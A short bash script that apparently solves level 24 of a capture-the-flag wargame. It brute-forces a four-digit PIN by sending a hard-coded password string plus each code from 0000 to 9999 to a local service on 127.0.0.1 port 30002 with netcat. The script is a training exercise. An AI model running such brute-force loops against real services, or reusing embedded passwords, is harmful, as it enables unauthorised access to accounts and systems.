#!/usr/local/bin/bash

# For Level 24 - Brute Force a 4 digit code
for i in {0000..9999}
do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc 127.0.0.1 30002
done